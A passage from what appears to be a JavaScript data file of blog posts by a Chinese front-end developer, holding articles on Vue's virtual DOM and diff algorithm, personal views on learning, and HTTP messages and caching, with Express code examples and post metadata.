创建vnode1虚拟dom对象\nvar vnode1 = h('div', {}, '我是div')\n// 创建vnode2虚拟dom对象\nvar vnode2 = h('ul', {}, [\n    h('li', {}, 'vnode2-xxx'),\n    h('li', {}, 'vnode2-yyy'),\n])\n// vnode1虚拟dom对象的结构\nvar vnode11 = {\n    sel: \"div\",\n    data: {},\n    children: undefined,\n    text: \"我是div\",\n    elm: undefined\n}\n// vnode2虚拟dom对象的结构\nvar vnode22 = {\n    sel: \"ul\",\n    data: {},\n    children: [\n        {\n            sel: \"li\",\n            data: {},\n            children: undefined,\n            text: \"vnode2-xxx\",\n            elm: undefined\n        },\n        {\n            sel: \"li\",\n            data: {},\n            children: undefined,\n            text: \"vnode2-yyy\",\n            elm: undefined\n        }\n    ],\n    text: undefined,\n    elm: undefined\n}\n```\n\n## 转化为真实dom\n\n```js\n// 将虚拟dom创建为真实dom\nfunction createElement(vnode) {\n    // 创建一个 DOM 节点\n    var domNode = document.createElement(vnode.sel)\n    // 判断是子节点还是文本？（二选一，要么是子节点要么是文本）\n    if (\n        vnode.text !== '' &&\n        (vnode.children === undefined || vnode.children.length === 0)\n    ) {\n        // 它内部是文字\n        domNode.innerText = vnode.text\n    } else if (Array.isArray(vnode.children) && vnode.children.length > 0) {\n        // 它内部是子节点，就要递归创建节点\n        for (var i = 0; i < vnode.children.length; i++) {\n            // 得到当前这个 child\n            var ch = vnode.children[i]\n            var chDom = createElement(ch)\n            // 将节点插入到父节点的末尾处\n            domNode.appendChild(chDom)\n        }\n    }\n    // 补充 elm 属性\n    vnode.elm = domNode\n    // 返回 elm，elm是一个纯dom对象\n    return vnode.elm\n}\n```\n\n```js\nconsole.log(createElement(vnode1)); //真实dom：<div>我是div</div>\nconsole.log(createElement(vnode2));//真实dom：<ul><li>vnode2-xxx</li><li>vnode2-yyy</li></ul>\n```\n\n# diff算法\n\ndiff翻译为\"差异\"，vue在更新dom操作时，会和新旧节点进行比较，使用最小量更新（即不会一律全部删除，重新新建，而是尽可能的在原本基础上进行\"修补\"）\n\n## patch\n\n```js\n// 将patch中新旧节点是同一个节点的操作抽离出来\nfunction patchVnode(oldVnode, newVnode) {\n    if (newVnode === oldVnode) {\n        console.log('新旧节点是同一个引用，啥都不做。')\n    } else {\n        if (newVnode.text != \"\" && newVnode.children == undefined || newVnode.children.length == 0) {\n            // 如果新节点是文本\n            if (newVnode.text == oldVnode.text) {\n                console.log('新节点的文本和旧文本节点的文本一样，啥都不干')\n            } else {\n                console.log('新节点的文本和旧文本节点的文本不一样，直接innerText')\n                oldVnode.elm.innerText = newVnode.text\n            }\n        } else {\n            // 新节点有children节点\n\n            if (oldVnode.text != \"\" && oldVnode.children == undefined || oldVnode.children.length == 0) {\n                // 新节点有children，且旧节点有text(即没有children)\n                console.log('新节点有children，且旧节点有text(即没有children)')\n                console.log(newVnode)\n                console.log(oldVnode)\n                oldVnode.elm.innerText = \"\"\n                oldVnode.text = \"\"\n                for (var i = 0; i < newVnode.children.length; i++) {\n                    let newVnodeElm = createElement(newVnode.children[i])\n                    oldVnode.elm.appendChild(newVnodeElm)\n                }\n                oldVnode.children = newVnode.children\n                // oldVnode.elm.appendChild(c)\n            } else {\n                console.log('新节点有children，且旧节点也有children，最为复杂');\n                // 新节点有children，且旧节点也有children，最为复杂\n                // 未完待续\n            }\n        }\n    }\n}\n\n// 新旧节点比较差异，进行修补\nfunction patch(oldVnode, newVnode) {\n    // 判断传入的第一个参数，是DOM节点还是虚拟节点？\n    if (oldVnode.sel === '' || oldVnode.sel === undefined) {\n        // 传入的第一个参数是DOM节点，此时要包装为虚拟节点\n        oldVnode = vnode(\n            oldVnode.tagName.toLowerCase(),\n            {},\n            [],\n            undefined,\n            oldVnode\n        )\n        console.log('传入的第一个参数是DOM节点，此时要包装为虚拟节点')\n        console.log(oldVnode)\n    }\n    // 判断 oldVnode和newVnode 是不是同一个节点\n    // 即节点key相同，且节点选择器相同\n    if (oldVnode.key === newVnode.key && oldVnode.sel === newVnode.sel) {\n        console.log('是同一个节点，开始精细化比较')\n        patchVnode(oldVnode, newVnode)\n    } else {\n        console.log('不是同一个节点(即选择器和key都不一样)，暴力删除旧的，插入新的')\n        let newVnodeElm = createElement(newVnode)\n        if (oldVnode.elm && newVnodeElm) {\n            // 先把新的节点插入到老节点前面\n            // 父节点.insertBefore(要插入的元素，在这个父节点的哪个节点插)\n            oldVnode.elm.parentNode.insertBefore(newVnodeElm, oldVnode.elm)\n        }\n        // 再删除老节点\n        oldVnode.elm.parentNode.removeChild(oldVnode.elm)\n    }\n}\n```\n\n# 参考\n\nhttps://www.bilibili.com/video/BV1v5411H7gZ\n\nhttps://zhuanlan.zhihu.com/p/108749463",
      click: 73,
      createdAt: '2021-03-26T02:41:32.000Z',
      updatedAt: '2021-03-26T02:41:32.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 76,
            article_id: 76,
            type_id: 1,
            createdAt: '2021-03-26T02:41:32.000Z',
            updatedAt: '2021-03-26T02:41:32.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 76,
            user_id: 1,
            article_id: 76,
            createdAt: '2021-03-26T02:41:32.000Z',
            updatedAt: '2021-03-26T02:41:32.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 75,
      title: '关于学习',
      is_comment: 1,
      status: 1,
      img: '/1616660095109关于学习.jpg',
      content:
        '# 关于学习\n\n这篇文章是我个人对于学习的看法，如果有新的体会心得，会不定期更新~\n\n首先，学习不管是学什么，本就都不是一件简单的事情，如果你现在学的东西打心底里令你感到不适甚至排斥，那么十有八九就注定你在这条路上也走不远（强扭的瓜不甜），但不管怎样，虽然强扭的瓜不甜，但解渴啊，所以很多人学习并不是因为从自身出发（如果有就是我要恰饭，恰饭就要学），大多数是某些原因而驱使自己去学习，比如大家都会我也得会、上班要用到、面试会问等等，前两个还好说，毕竟是刚需，最后的一个因为面试会问，这个可以展开说说，如：\n\n-  js基础：异步（单线程），面向对象（基于原型链），事件机制（event loop）等；\n- 偏前端：vue（虚拟dom，diff，响应式），webpack，node等；\n- 偏理论：计算机网络，数据结构和算法，操作系统等；\n- 偏业务：SEO，跨域，性能优化等\n\n## 灵魂拷问\n\n> 看diff时，一位尚硅谷老师的话：扪心自问，你真的了解diff吗？\n>\n> 看promise时，一位b站up主小叶森森：我们很庆幸可以站长巨人的肩膀上学习，而不是成为像牛顿那样的巨人。\n>\n> 还有什么都会亿点点的coderwhy：不要只会调别人的api而不会原理，编程学的是思想。\n\n我个人认为，学习的东西都是由点到面的。\n\n- 如果你说你会vue，那如果你不了解虚拟dom，diff和响应式，那么你只能说你会用vue；\n- 如果你看过一些面试题是关于http状态码，get/post请求区别，tcp三次握手，然后就认为自己了解网络协议，那说实话格局也太小了；\n- 如果你说你有一年（甚至更多）工作经验，但你没接触过跨域，没了解过SEO，甚至vue全家桶都没用全过的（你公司不用vue另说），那说实话连搬砖都赶不上热乎的砖头。\n- 如果你说以上的东西用不上，那么当我没说，你是对的。\n\n# 学习之路\n\n> 我在学习的路上看过很多视频，文章，官网文档等等，有很多学习资料都是通过"白嫖"，"众筹"等方式获取的\n\n## 视频\n\n​\t\t对于大多数视频，基本都是培训机构里面的课，因此说实话其实大多数这些课里面的老师最多只能把他自己的知识教给你，有的甚至直接对着文档读一遍，然后直接上代码怎么用，至于为什么这样用，并没有说，只是让你知道怎么用，还有的视频里面的讲课的那个人，讲课的出发点压根就不是给你听的，粗俗的讲就是，SONY和夏普造手机，并不是主要是给消费者用的而是来炫耀技术的~，因为SONY和夏普的主要业务并不是造手机，更像是凑个热闹；有些比较有良心的老师或者巨佬（coderwhy，小野森森等等），就会从头到尾给你解释清楚。\n\n## 文章\n\n​\t\t对于文章，国内环境csdn里面的cv文章满天飞，有的文章把书里面的内容原封不动的搬过来，没有任何对于自己的看法，其实这种文章显得毫无意义，或者可能发文章的那个人本身就不是写给你们看的吧。当然也有很多优秀的文章，既然文章内容参差不齐，那就多看多对比，多思考，取其精华去其糟粕。\n\n## 官方文档\n\n​\t\t对于官方文档，这个其实是相对来说最靠谱的（如果官方有中文的话就最好不过），但是官方的内容优缺点都是：太官方了...，但是水平达到一定境界的时候，官方文档毫无疑问都是最好的，每个阶段水平去看同样的官方文档，都会有不同的理解。\n\n## 水群\n\n​\t\t说实话在一些群里聊天，光看聊天记录都能学到很多东西~，而且群里面也有很多巨佬，但是一般遇到问题，都是先自己思考一下能不能解决，如果以上三种办法都解决不了了，才会面向群友编程。毕竟如果是简单的问题，上面的办法基本都能解决，如果解决不了，那么只有一个问题：菜是原罪。\n\n# 我的看法\n\n## 为什么学\n\n首先我个人是很遵从内心的，不喜欢做的事情就不会去做，做了就要做好，就比如虽然在学习学的并不是前端，但是既然后面选择了这个，就要把它给做好。对于技术，更是如此，特别是计算机这东西，不是0就是1，没有中间值这一说法，会就会不会就是不会。我个人一开始是非常反感那些面试题的，因为面试题里面的东西很多都和前端关系不大，就比如数据结构算法，前端很少用上或者说基本用不上，那么要学吗？\n\n​\t想起b站的一个up主小野森森说过，其实前端真正有啥好学的，就比如b站这个官网，不就是几个div，一堆列表渲染，你不会数据结构算法这些，能写出来吗？当然也能写出来，但是如果前端就这么简单的话那么谁不能干啊，你能干别人也能干，别人会你不会，这样你的竞争力就比别人弱了。\n\n​\t所以答案是要学的，但是可能并不是现在立刻马上，可能是等你技术到达一定水平后再学，但是我个人就特别反感那些不愿接受现实的人（不会就不会，别把用不到当借口）。\n\n## 怎么学\n\n​\t我认为学习，不管是别人教的，官方文档写的，甚至书上的内容都不一定是最最准确的，就比如coderwhy说的，lodash库里面的防抖节流代码，里面的返回值就是错误的写法（不知道现在更新了没），只是因为需要用到返回值的这个需求少，虽然很多人用loash里面的防抖节流，但是很少有人用到里面的返回值，所以没什么人知道，但是看了源码加上实际代码效果，它就是有bug的。对于学习，不只是自己接受知识，更重要的是要学会思考，多问为什么，打破砂锅问到底。\n\n# 我遇到的\n\n在学习的路上遇到很多有意思的人，有大佬，也有菜鸡，奇葩也见过\n\n## 刚入坑的奇葩\n\n这是一个刚学前端的准应届毕业生，这类人都有个典型的特点（包括当初的我自己），就是特别的浮躁。但现在回头看觉得还是挺傻的，学习就像长身体长高，是一点点积累的，不可能一蹴而就，没有时间积累，就算吃的再多饭也没用，只会短时间让自己膨胀（不长高但长胖），但本质上还是虚的。\n\n而且出来混的总是要还的，想用两三个月学人家（这里的”人家“特指正常学习的，并非混日子的）两三年的东西，凭啥（智商高当我没说）\n![关于学习1.jpg](https://img.cdn.hsslive.cn/1616660030492关于学习1.jpg)\n\n![关于学习2.jpg](https://img.cdn.hsslive.cn/1616660042959关于学习2.jpg)\n\n![关于学习3.jpg](https://img.cdn.hsslive.cn/1616660055737关于学习3.jpg)\n\n## "迷之大佬"\n\n刷过上百道面试题的"迷之大佬”（一开始我看他发了笔试题怎么写，我看上去比较感兴趣，好像也不难，就写了下，后面又问继续反问了她几个笔试题，结果都挂了，后面才看到她发她面试过的题目），为啥说”迷之大佬“，因为我个人觉得就是看过的就会，没看过的就不行，给我的感觉就是如果简单的不会，难的会，那么有很大的”背书“的嫌疑，而背书谁不会呢。\n\n![关于学习4.jpg](https://img.cdn.hsslive.cn/1616660067511关于学习4.jpg)\n\n![关于学习5.jpg](https://img.cdn.hsslive.cn/1616660075336关于学习5.jpg)\n\n## 真巨佬\n\n​\t\t这个还是比较少的，有也是不怎么认识的，，，但是巨佬是真的巨佬，自制力，学习能力，抗压能力等感觉都非常强悍。\n\n## 其他\n\n​\t还有遇到一些我个人觉得能力可以的，但是却进了小公司；反而一些水平一般的拿的钱比那些能力强的人多。其实在前端这条路上遇到的有意思的人很多，有一些现在还有联系，有些现在已经没啥联系了，也不清楚转行与否，但总的来说给我的感觉就是：人真不能一概而论，并不能根据结果判断一个人的好坏。但不管怎样，提升自己才是主要，这才是以后发展的前提。\n\n## 感想\n\n坦白说我比较在意细节，要么就不做，做就知根知底。虽然我是文科生，但是我本人是极其反对背书的，如果靠背而不是靠理解学来的东西（比如偏理论的东西），宁可暂时不学，也不浪费时间去背这些虚无缥缈的东西。\n\n',
      click: 164,
      createdAt: '2021-03-25T08:14:55.000Z',
      updatedAt: '2021-03-25T08:14:55.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 75,
            article_id: 75,
            type_id: 3,
            createdAt: '2021-03-25T08:14:55.000Z',
            updatedAt: '2021-03-25T08:14:55.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 75,
            user_id: 1,
            article_id: 75,
            createdAt: '2021-03-25T08:14:55.000Z',
            updatedAt: '2021-03-25T08:14:55.000Z',
          },
        },
      ],
      comments: [
        {
          id: 28,
          article_id: 75,
          from_user_id: 31,
          to_comment_id: -1,
          to_user_id: -1,
          content: '说得很好！！',
          createdAt: '2021-04-23T02:13:37.000Z',
          updatedAt: '2021-04-23T02:13:37.000Z',
        },
        {
          id: 31,
          article_id: 75,
          from_user_id: 43,
          to_comment_id: -1,
          to_user_id: -1,
          content:
            '真的讲太好了吧！！一丢经验，你以为的代码和别人的完全一样，不可能的。跑不起来，绝对是哪里不一样而你没看出来',
          createdAt: '2021-10-02T14:38:20.000Z',
          updatedAt: '2021-10-02T14:38:20.000Z',
        },
      ],
      tags: [],
    },
    {
      id: 74,
      title: 'http协议',
      is_comment: 1,
      status: 1,
      img: '/1616342412186http协议.jpg',
      content:
        "# http协议\n\n超文本传输协议（HyperText Transfer Protocol）是一种无状态的，以请求/应答方式运行的协议\n\n## 优点\n\n1. **「灵活可扩展」**。一个是语法上只规定了基本格式，空格分隔单词，换行分隔字段等。另外一个就是传输形式上不仅可以传输文本，还可以传输图片，视频等任意数据。\n2. **「请求-应答模式」**，通常而言，就是一方发送消息，另外一方要接受消息，或者是做出相应等。\n3. **「可靠传输」**，HTTP是基于TCP/IP，因此把这一特性继承了下来。\n4. **「无状态」**。\n\n## 缺点\n\n1. **「无状态」**，有时候，需要保存信息，比如像购物系统，需要保留下顾客信息等等，另外一方面，有时候，无状态也会减少网络开销，比如类似直播行业这样子等，这个还是分场景来说。\n2. **「明文传输」**，即协议里的报文(主要指的是头部)不使用二进制数据，而是文本形式。这让HTTP的报文信息暴露给了外界，给攻击者带来了便利。\n3. **「队头阻塞」**，当http开启长连接时，共用一个TCP连接，当某个请求时间过长时，其他的请求只能处于阻塞状态，这就是队头阻塞问题。\n\n# http报文格式\n\n## 请求报文\n\n### 请求行\n\n> 请求行由请求`Method`, `URL` 字段和`HTTP Version`三部分构成, 总的来说请求就是定义了本次请求的请求方式, 请求的地址, 以及所遵循的HTTP协议版本例如：\n>\n> ```http\n> GET /example.html HTTP/1.1 (CRLF)\n> ```\n>\n> HTTP协议的方法有： \n>\n> *`GET`： 请求**获取**Request-URI所标识的资源* \n>\n> `POST`： 在Request-URI所标识的资源后**增加**新的数据\n>\n> `HEAD`： 请求获取由Request-URI所标识的资源的**响应消息报头**\n>\n> `PUT`： 请求服务器**存储或修改**一个资源，并用Request-URI作为其标识 \n>\n> `DELETE`： 请求服务器**删除**Request-URI所标识的资源\n>\n> `TRACE`： 请求服务器回送收到的请求信息，主要用于**测试或诊断**\n>\n> `CONNEC`： 保留将来使用\n>\n> `OPTIONS`： 请求查询服务器的性能，或者查询与资源相关的选项和需求\n\n### 请求头\n\n> 消息报头由一系列的键值对组成，允许客户端向服务器端发送一些附加信息或者客户端自身的信息，主要包括：\n\n- Accept:用户代理可处理的媒体类型\n- Accept-charset:优先的字符集\n- Accept-Encoding:优先的编码格式\n- Accept-Lauguage:有限的语言（中文，英文等）\n- Authorization:Web认证信息(常用来携带token)\n- Host:请求资源所在的服务器（唯一一个必须的）\n- Range:实体请求的字节范围\n- User-Agent:HTTP客户端程序的信息\n- If-Match：比较实体标记(ETage)\n- If-None-Match：比较实体标记(ETage) 与lf-Match相反\n- lf-Modified-Since：比较资源更新时间(Last-Modified)\n- lf-Unmodified-Since：比较资源更新时间(Last-Modified)，与lf-Modified-Since相反\n- If-Rnages：资源未更新时发送实体byte的范围请求\n\n### 请求正文\n\n> 只有在发送`POST`请求时才会有请求正文，`GET`方法并没有请求正文。\n\n## 响应报文\n\nHTTP响应也由三部分组成，包括状态行，消息报头，响应正文。\n\n### 响应行\n\n响应行也由三部分组成，包括HTTP协议的版本，状态码，以及对状态码的文本描述。例如：\n\n```bash\nHTTP/1.1 200 OK （CRLF）\n```\n\n#### 状态码\n\n> 1xx：指示信息--表示请求已接收，继续处理\n>\n> 2xx：成功--表示请求已被成功接收、理解、接受\n>\n> 3xx：重定向--要完成请求必须进行更进一步的操作\n>\n> 4xx：客户端错误--请求有语法错误或请求无法实现\n>\n> 5xx：服务器端错误--服务器未能实现合法的请求\n\n- 200 OK 表示从客户端发来的请求在服务器端被正确请求。\n\n- 204 No content，表示请求成功，但没有资源可返回。\n\n- 200 from memory cache 不访问服务器，直接读缓存，从内存中读取缓存。此时的数据时缓存到内存中的，当kill进程后，也就是浏览器关闭以后，数据将不存在。但是这种方式只能缓存派生资源\n\n- 200 from disk cache 不访问服务器，直接读缓存，从磁盘中读取缓存，当kill进程时，数据还是存在。这种方式也只能缓存派生资源\n\n- 301 moved permanently，永久性重定向，表示资源已被分配了新的 URL，这时应该按 Location 首部字段提示的 URI 重新保存。\n\n- 302 found，临时性重定向，表示资源临时被分配了新的 URL。\n\n- 304 Not Modified 访问服务器，发现数据没有更新，服务器返回此状态码。然后从缓存中读取数据。\n\n- > 当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送 301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做400 bad request，请求报文存在语法错误。\n\n- 401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息。\n\n- 403 forbidden，表示对请求资源的访问被服务器拒绝。\n\n- 404 not found，表示在服务器上没有找到请求的资源。\n\n- 405 Method Not Allowed，服务器禁止使用该方法，客户端可以通过options方法来查看服务器允许的访问方法\n\n- 500 internal sever error，表示服务器端在执行请求时发生了错误。\n\n- 502 Bad Gateway，服务器自身是正常的，访问的时候出了问题，具体啥错误我们不知道。\n\n> 如果没有设置http缓存，浏览器发送请求但是返回的数据和上次的一样，返回状态码：304 Not Modified；如果设置了http缓存，如果命中强缓存会返回200 OK (from disk cache，from memory cache等)；如果命中协商缓存，会返回304 Not Modified\n\n### 响应头\n\n- Accept-Range:是否接收范围请求\n- Age:推算资源创建时间\n- Server:HTTP服务器的安装信息\n- ETag:资源的匹配信息(相当于资源的id)\n- location:令客户端重定向的URL\n- Retry-After:对客户端再次发起请求的时机要求(主要配合503状态码使用)\n- Vary:代理服务器缓存的管理信息\n\n### 响应报文\n\n## 通用首部字段\n\n> 请求报文和响应报文都会使用的首部字段。\n\n- cache-Control:控制缓存的行为\n- Connection:连接的管理(keep-alive)\n- Data:创建报文的日期\n- via:代理服务器的相关信息\n- pragma:报文指令\n- Trailer:报文末端首部\n- Upgrade:升级为其他协议\n- Transfer-Encoding:报文主体的编码方式\n\n## 实体首部字段\n\n> 实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部。\n\n- Allow，告诉客户端，服务器能接受的http请求方法，比如GET、POST、DELETE、OPTIONS、PUT等，当客户端使用的方法，服务器不能够支持的时候就会响应405 Method Not Allowed\n- Content-Encoding:实体主体的编码方式\n- Content-Charset:实体主体的字符集\n- Content-Language:实体主体的语言\n- Cntent-Length:实体主体的大小(字节长度）\n- Content-Type:实体主体的媒体类型\n- Content-Range:实体主体的位置范围\n- Expires:实体主体的过期时间(配合cache-control来使用，控制缓存)\n- Last-Modify:实体主体的最后修改时间\n\n\n\n# HTTP 缓存机制\n\nhttp缓存机制主要在http响应头中设定，响应头中相关字段为Expires、Cache-Control、Last-Modified、If-Modified-Since、Etag。\n\n## 强缓存\n\n不会向服务器发送请求，直接从缓存中读取资源，在chrome控制台的Network选项中可以看到该请求返回200的状态码，并且size显示from disk cache或from memory cache两种（灰色表示缓存）。\n\n- **Expires ：**response header里的过期时间，浏览器再次加载资源时，如果在这个过期时间内，则命中强缓存。\n- **Cache-Control:**当值设为max-age=300时，则代表在这个请求正确返回时间（浏览器也会记录下来）的5分钟内再次加载资源，就会命中强缓存。\n\n> 区别：Expires 是http1.0的产物，Cache-Control是http1.1的产物\n> 两者同时存在的话，Cache-Control优先级高于Expires\n> Expires其实是过时的产物，现阶段它的存在只是一种兼容性的写法\n\n```js\napp.use('/star', function (req, res,) {\n    res.setHeader('Cache-Control', 'max-age=3')\n    var data = { code: new Date().getTime() }\n    res.json(data)\n})\n```\n\n设置了/star接口为强缓存，第一次请求star，返回200，然后在3秒内不管请求多少次star，都是从缓存里面读数据，如果三秒后请求，服务器收到请求后判断，获取到的数据和上一次获取的数据对比没有更新（即请求头If-None-Match和返回的响应头etag一致），就会返回304状态码和新的response header通知浏览器从缓存中读取资源；如果对比后发现数据更新了，就会返回200状态码并且从请求响应里读取数据\n\n## 协商缓存\n\n> 协商缓存使用Cache-Control的no-cache和no-store实现\n\n向服务器发送请求，服务器接收到这个请求，会根据这个请求的request header的一些参数如：If-None-Match，来判断是否命中协商缓存，如果服务器接收到这个请求的请求头有If-None-Match，就会判断这个If-None-Match是否和这次请求返回的Etag一致，如果一致就代表命中协商缓存，就会返回304状态码和带上新的response header通知浏览器从缓存中读取资源\n\n```js\napp.use('/tag', function (req, res,) {\n    /**\n     * 协商缓存，每次都会发请求判断资源是否更新，\n     * 如果资源更新了，就返回200状态码，如果没更新就返回304状态码\n    */\n    // 设置协商缓存\n    res.setHeader('Cache-Control', 'no-cache')\n    // 获取请求头的if-none-match\n    console.log(req.headers['if-none-match'])\n    var data = { code: new Date().getFullYear() }\n    res.json(data)\n    // 设置了Cache-Control:no-cache后，手动设置status状态码不管用。\n    // res.status(200).json(data)\n})\n```\n\n上面是node设置了/tag接口的协商缓存，浏览器第一次请求/tag时，会在请求头if-none-match带上上次响应头的Etag（因为是第一次请求，因此获取到的if-none-match为undefined），node收到这个请求后，判断if-none-match，发现是undefined，即代表是第一次请求，因此就返回200状态码以及根据返回的data数据生成的唯一标识给响应头Etag；\n\n浏览器第二次请求/tag时，会把上次请求的/tag时的响应头Etag，设置在请求头if-none-match上，node服务器收到请求后，判断请求头的if-none-match，发现这个if-none-match和这次返回的data生成的唯一标识一样（因为data都是{code:2021}，因此生成的标识也一样），则命中协商缓存，返回304状态码和新的response header通知浏览器从缓存中读取资源。\n\n```js\napp.use('/tag', function (req, res,) {\n    /**\n     * 协商缓存，每次都会发请求判断资源是否更新，\n     * 如果资源更新了，就返回200状态码，如果没更新就返回304状态码\n    */\n    // 设置协商缓存\n    res.setHeader('Cache-Control', 'no-cache')\n    // 获取请求头的if-none-match\n    console.log(req.headers['if-none-match'])\n    var data = { code: new Date().getTime() }\n    res.json(data)\n    // 设置了Cache-Control:no-cache后，手动设置status状态码不管用。\n    // res.status(200).json(data)\n})\n```\n\n这里虽然设置了协商缓存，但是因为每次返回的数据都不一样（每次请求的时间戳都不一样），因此每次请求都不会取缓存里的数据。node每次都会返回200状态码并且从请求响应里读取数据。\n\n```js\napp.use('/link', function (req, res,) {\n    res.setHeader('Cache-Control', 'no-store')\n    var data = { code: new Date().getFullYear() }\n    res.json(data)\n})\n```\n\n```js\napp.use('/link', function (req, res,) {\n    res.setHeader('Cache-Control', 'no-store')\n    var data = { code: new Date().getTime() }\n    res.json(data)\n})\n```\n\n设置了no-store后，所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存。每次请求不管数据是不是最新的，都从服务器重新拿数据。\n\n## 强缓存和协商缓存区别\n\n> 共同点：都会从客户端缓存中读取资源；\n> 不同点：强缓存不会发请求，协商缓存会发请求。\n>\n> 协商缓存既然都要发起请求了，为什么还要判断资源有没有更新，直接将请求返回的数据进行读取不就完事了吗？当然不是。\n>\n> 服务器端判断资源有没有更新，如果服务器端判断到返回是数据和上次的不一样，即更新了，服务端就返回200状态码和新数据给客户端，并通知客户端使用新数据；客户端接收到后，就用服务端返回的新数据；\n>\n> 如果服务器端判断到返回是数据和上次的一样，即没有更新，就不会返回数据，返回一个304状态码通知客户端直接从缓存里面拿之前的处理好的数据即可，这样的好处是节省了两个环节的时间，一个是服务端不用把新数据重新返回给客户端，直接返回304状态码就可以了（返回一个状态码总比返回一堆数据的传输时间来的快。），另一个是客户端收到304后，知道了资源没有更新，不用花时间处理新数据，而是直接从缓存里面读取之前处理好的数据即可。\n\n##  Expires\n\nHTTP 1.0协议中的。简而言之，就是告诉浏览器在约定的这个时间前，可以直接从缓存中获取资源（representations），而无需跑到服务器去获取。\n\n**另：**Expires因为是对时间设定的，且时间是Greenwich Mean Time （GMT），而不是本地时间，所以对时间要求较高。\n\n## Cache-Control\n\nHTTP1.1协议中的，因为有了它，所以可以忽略上面提到的Expires。因为Cache-Control相对于Expires更加具体，细致。且就算同时设置了Cache-Control和Expires，Cache-Control的优先级也高于Expires。\n\n下面就来看看，Cache-Control响应头中常用字段的具体含义：\n\nmax-age：用来设置资源（representations）可以被缓存多长时间，单位为秒；设置了max-age后，会在缓存时间内不发请求，从客户端缓存里读取数据，图片对应的是 memory cache、css等资源是 disk cache，且状态码是：**304 Not Modified**；如果客户端禁用了缓存（即开启Disable Cache），则max-age会失效，照常发请求。\n\ns-maxage：和max-age是一样的，不过它只针对代理服务器缓存而言；\n\npublic：指示响应可被任何缓存区缓存；\n\nprivate：只能针对个人用户，而不能被代理服务器缓存；\n\nno-cache：强制客户端直接向服务器发送请求,也就是说每次请求都必须向服务器发送。服务器接收到请求，然后判断资源是否变更，是则返回新内容，否则返回304，未变更。这个很容易让人产生误解，使人误以为是响应不被缓存。实际上Cache-Control: no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。\n\nno-store：禁止一切缓存（这个才是响应不被缓存的意思）。\n\n## Last-Modified和If-Modified-Since\n\nLast-Modified和If-Modified-Since表示响应资源在服务器最后修改时间。\n\n与Etag相比，不足为：\n\n- Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话（比如日志文件，一秒钟内有十个人访问，就会修改十次这个文件），它将不能准确标注文件的修改时间；\n\n- 如果某些文件内容并没有变化，但Last-Modified却改变了，也会导致无法使用缓存(如果Etag和Last-Modified两种都使用的话，虽然文件没更新etag就不会更新，但是最后修改时间更新了即Last-Modified更新了，所以结果还是不会触发缓存，除非不使用Last-Modified，只是用Etag的方式设置缓存。)；\n\n  ```js\n  app.get('/http1', function (req, res) {\n      // Last-Modified只有是数字，或者数字字符串缓存才会起作用\n      // 如果Last-Modified是非数字的话，不会起到缓存作用\n      res.setHeader('Last-Modified', new Date().getTime())\n      res.json({ code: new Date().getFullYear() })\n  })\n  // 每次请求/http1，都会改变响应头的Last-Modified，但是内容却都是一样的，会造成缓存无法使用。\n  ```\n\n- 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。\n\n- 然而，Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。\n\n## Etag和If-None-Match\n\n1. ETag与If-None-Match是一对报文，属于http 1.1。\n2. ETag可以用来解决这种问题。ETag是一个文件的唯一标志符。就像一个哈希或者指纹，每个文件都有一个单独的标志，只要这个文件发生了改变，这个标志就会发生变化。\n3. ETag机制类似于乐观锁机制，如果请求报文的ETag与服务器的不一致，则表示该资源已经被修改过来，需要发最新的内容给浏览器。\n4. **同时使用这两个报文头，在完全匹配If-Modified-Since和If-None-Match即检查完修改时间和Etag之后，如都与服务器的相符，服务器返回304，否则，发送最新内容给浏览器。**\n\nEtag/lastModified过程如下：\n\n1. 客户端请求一个页面（A）。\n2. 服务器返回页面A，并在给A的响应头加上Last-Modified/ETag。\n3. 客户端展现该页面，并将页面连同Last-Modified/ETag一起缓存。\n4. 客户再次请求页面A，并将上次请求时服务器返回的Last-Modified/ETag作为请求头的If-Modified-Since/If-None-Match一起传递给服务器。\n5. 服务器检查该Last-Modified/ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304和一个空的响应体。\n\n\n\n# HTTP0.9\n\n最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令`GET`。\n\n> ```http\n> GET /index.html\n> ```\n\n上面命令表示，TCP 连接（connection）建立后，客户端向服务器请求（request）网页`index.html`。\n\n协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。\n\n> ```html\n> <html>\n> <body>Hello World</body>\n> </html>\n> ```\n\n服务器发送完毕，就关闭TCP连接。\n\n# HTTP1.0\n\n1996年5月，HTTP/1.0 